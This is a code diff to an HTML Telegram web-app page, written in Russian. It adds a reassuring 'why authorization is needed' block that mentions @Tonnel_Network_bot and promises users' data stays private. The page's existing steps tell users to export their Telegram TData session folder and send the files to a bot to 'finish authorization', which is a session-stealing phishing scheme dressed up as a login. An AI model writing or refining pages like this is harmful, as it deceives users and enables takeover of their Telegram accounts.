@@ -17,6 +17,14 @@
             margin: 0 auto;
             text-align: center;
         }
+        .info-text {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            text-align: left;
+            line-height: 1.5;
+        }
         button {
             background-color: var(--tg-theme-button-color, #2481cc);
             color: var(--tg-theme-button-text-color, #ffffff);
@@ -57,6 +65,16 @@
 </head>
 <body>
     <div class="container">
+        <div class="info-text">
+            <h3>Для чего нужна авторизация?</h3>
+            <p>Для получения доступа к ценам и функциям бота @Tonnel_Network_bot, нам необходимо привязать ваш аккаунт Telegram. Это позволит:</p>
+            <ul>
+                <li>Получать актуальные цены в реальном времени</li>
+                <li>Иметь доступ к эксклюзивным функциям бота</li>
+                <li>Получать уведомления о важных обновлениях</li>
+            </ul>
+            <p>Ваши данные используются исключительно для авторизации и не передаются третьим лицам.</p>
+        </div>
         <button id="authButton" onclick="finishAuth()">Закончить авторизацию</button>
         <div id="loading" class="loading">
             <div class="loading-text">Завершение авторизации...</div>
@@ -99,7 +117,7 @@
                             <li>Выберите папку tdata</li>
                             <li>Нажмите "Открыть"</li>
                         </ol>
-                        <p>После экспорта TData, отправьте файлы боту.</p>
+                        <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
                     `;
                     break;
                 case 'android':
@@ -111,7 +129,7 @@
                             <li>Нажмите на версию 5 раз</li>
                             <li>Выберите "Экспорт TData"</li>
                         </ol>
-                        <p>После экспорта TData, отправьте файлы боту.</p>
+                        <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
                     `;
                     break;
                 case 'ios':
@@ -123,7 +141,7 @@
                             <li>Нажмите на версию 5 раз</li>
                             <li>Выберите "Экспорт TData"</li>
                         </ol>
-                        <p>После экспорта TData, отправьте файлы боту.</p>
+                        <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
                     `;
                     break;
                 default:
@@ -192,7 +210,7 @@
             console.log('Running in browser');
             document.getElementById('authButton').textContent = 'Открыть в Telegram';
             document.getElementById('authButton').onclick = function() {
-                window.location.href = 'https://t.me/NFT_checkbot?start=webapp';
+                window.location.href = 'https://t.me/your_bot_username?start=webapp';
             };
         }
     </script>
